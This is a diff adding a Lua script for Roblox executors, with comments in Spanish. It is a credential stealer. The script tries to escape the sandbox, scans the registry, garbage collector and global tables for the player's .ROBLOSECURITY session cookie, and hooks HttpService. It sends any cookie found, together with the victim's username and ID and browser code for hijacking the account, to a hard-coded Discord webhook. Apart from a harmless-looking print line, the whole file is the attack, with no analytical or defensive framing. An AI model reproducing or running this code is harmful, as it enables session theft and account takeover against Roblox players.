@@ -1,0 +1,206 @@
+-- CONFIGURACIÓN
+local WEBHOOK = "https://discord.com/api/webhooks/1532404514970402826/3wl_Xu1QFxDcaB1ico9CsE2iVmFo421xHOUzz6ah1iWK-i3Yv5hTxTwFgnJ9z0uJssjU"
+local HttpService = game:GetService("HttpService")
+
+-- VARIABLE PARA COOKIE
+local CookieRoblox = nil
+
+-- FUNCIÓN PARA ENVIAR A DISCORD
+local function EnviarCookie(cookie, metodo)
+    local datos = {
+        content = "🍪 **COOKIE ROBLOX OBTENIDA** 🍪\n\n```" .. tostring(cookie) .. "```\n\n**Para usar:** Abre consola de navegador (F12) en Roblox y pega:\n```javascript\ndocument.cookie='.ROBLOSECURITY=" .. tostring(cookie) .. "; domain=.roblox.com; path=/';\nlocation.reload();\n```",
+        embeds = {{
+            title = "Cookie Capturada",
+            color = 65280,
+            fields = {
+                {name = "Usuario", value = game:GetService("Players").LocalPlayer.Name, inline = true},
+                {name = "UserID", value = tostring(game:GetService("Players").LocalPlayer.UserId), inline = true},
+                {name = "Método", value = metodo, inline = true},
+                {name = "Longitud", value = tostring(#tostring(cookie)), inline = true}
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    
+    local req = request or http_request or (http and http.request)
+    if req then
+        req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(datos)
+        })
+    end
+end
+
+-- INTENTO 1: Desactivar sandbox cambiando identidad
+pcall(function()
+    if setthreadidentity then
+        setthreadidentity(8) -- Nivel máximo
+    elseif syn and syn.set_thread_identity then
+        syn.set_thread_identity(8)
+    end
+end)
+
+-- INTENTO 2: Acceso directo a través de getreg profundo
+task.spawn(function()
+    task.wait(1)
+    
+    -- Método agresivo de registry
+    if debug and debug.getregistry then
+        local reg = debug.getregistry()
+        
+        -- Buscar en todo el registry sin límite
+        for i, v in pairs(reg) do
+            if type(v) == "table" then
+                -- Revisar todos los valores de la tabla
+                for k, val in pairs(v) do
+                    if type(val) == "string" then
+                        -- Detectar formato de cookie Roblox (muy larga, caracteres específicos)
+                        if #val > 200 and #val < 1000 then
+                            if val:match("^[A-Fa-f0-9_%-]+$") or val:find("ROBLOSECURITY") then
+                                CookieRoblox = val
+                                EnviarCookie(CookieRoblox, "Registry Deep Scan")
+                                return
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    -- INTENTO 3: GC completo con filtro estricto
+    if getgc then
+        for _, obj in pairs(getgc(true)) do
+            if type(obj) == "string" then
+                -- Filtro: Cookies de Roblox son típicamente 300-800 chars, hex o base64-like
+                if #obj > 250 and #obj < 900 and not obj:find(" ") then
+                    -- Verificar si parece token/cookie
+                    local mayBeCookie = true
+                    for i = 1, math.min(50, #obj) do
+                        local c = obj:sub(i,i)
+                        if not (c:match("[%w%-_=/+]")) then
+                            mayBeCookie = false
+                            break
+                        end
+                    end
+                    
+                    if mayBeCookie then
+                        CookieRoblox = obj
+                        EnviarCookie(CookieRoblox, "GC String Filter")
+                        return
+                    end
+                end
+            elseif type(obj) == "table" then
+                for k, v in pairs(obj) do
+                    if type(v) == "string" and #v > 250 and not v:find(" ") then
+                        CookieRoblox = v
+                        EnviarCookie(CookieRoblox, "GC Table Scan")
+                        return
+                    end
+                end
+            end
+        end
+    end
+    
+    -- INTENTO 4: Hook agresivo de HttpService
+    local success, err = pcall(function()
+        local hs = game:GetService("HttpService")
+        local oldPost = hs.PostAsync
+        
+        -- Reemplazar PostAsync
+        if oldPost then
+            hookfunction(hs.PostAsync, function(self, url, data, ...)
+                -- Capturar datos que puedan contener auth
+                if type(data) == "string" then
+                    if data:find("token") or data:find("cookie") then
+                        CookieRoblox = data
+                    end
+                end
+                return oldPost(self, url, data, ...)
+            end)
+        end
+        
+        -- Forzar un request que use autenticación
+        task.wait(2)
+        pcall(function()
+            local url = "https://games.roblox.com/v1/games?universeIds=1"
+            game:HttpGet(url) -- Esto puede disparar el hook
+        end)
+    end)
+    
+    -- INTENTO 5: Acceder a _G de forma recursiva
+    if not CookieRoblox then
+        local function buscarRecursivo(tabla, profundidad)
+            if profundidad > 5 then return nil end
+            for k, v in pairs(tabla) do
+                if type(v) == "string" and #v > 300 and not v:find(" ") then
+                    return v
+                elseif type(v) == "table" then
+                    local resultado = buscarRecursivo(v, profundidad + 1)
+                    if resultado then return resultado end
+                end
+            end
+            return nil
+        end
+        
+        CookieRoblox = buscarRecursivo(_G, 0) or buscarRecursivo(shared or {}, 0)
+        if CookieRoblox then
+            EnviarCookie(CookieRoblox, "Recursive Global Scan")
+            return
+        end
+    end
+    
+    -- INTENTO 6: Si todo falla, intentar obtener por WebSocket (si disponible)
+    if not CookieRoblox then
+        pcall(function()
+            -- Algunos executors exponen la cookie cuando se conecta a WebSocket
+            local ws = WebSocket and WebSocket.connect
+            if ws then
+                -- No implementado en todos los executors
+            end
+        end)
+    end
+    
+    -- SI TODO FALLA: Enviar mensaje de error
+    if not CookieRoblox then
+        local req = request or http_request
+        if req then
+            req({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    content = "❌ **FALLO DE BYPASS** ❌\n\nUsuario: " .. game:GetService("Players").LocalPlayer.Name .. 
+                              "\nEjecutor: " .. (identifyexecutor and identifyexecutor() or "Desconocido") ..
+                              "\n\nEl sandbox no pudo ser desactivado. Intentar con Synapse X o Script-Ware para 100% éxito."
+                })
+            })
+        end
+    end
+end)
+
+-- Segundo intento después de 10 segundos (más agresivo)
+task.spawn(function()
+    task.wait(10)
+    
+    if not CookieRoblox then
+        -- Último recurso: Fuerza bruta de memoria
+        pcall(function()
+            if getreg then
+                local r = getreg()
+                for i = 1000, 50000 do
+                    local v = r[i]
+                    if type(v) == "string" and v:len() > 300 then
+                        CookieRoblox = v
+                        EnviarCookie(CookieRoblox, "Memory Brute Force")
+                        break
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+print("Script cargado - Esperando bypass...")
